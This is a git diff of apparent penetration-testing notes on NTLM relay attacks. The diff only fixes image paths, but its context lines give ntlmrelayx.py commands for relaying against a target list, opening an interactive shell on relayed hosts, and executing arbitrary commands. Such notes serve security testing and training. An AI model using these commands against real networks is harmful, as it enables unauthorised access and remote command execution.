@@ -34,16 +34,23 @@ ntlmrelayx.py -tf targets.txt -smb2support
 
 
 
-<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
 
 get terminal access
 
 ntlmrelayx.py -tf targets.txt -smb2support -i
 
-<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
 
 Can also execute commands through this
 
 
 
 ntlmrelayx.py -tf targets.txt -smb2support -c "command"
+
+
+
+
+
+
+
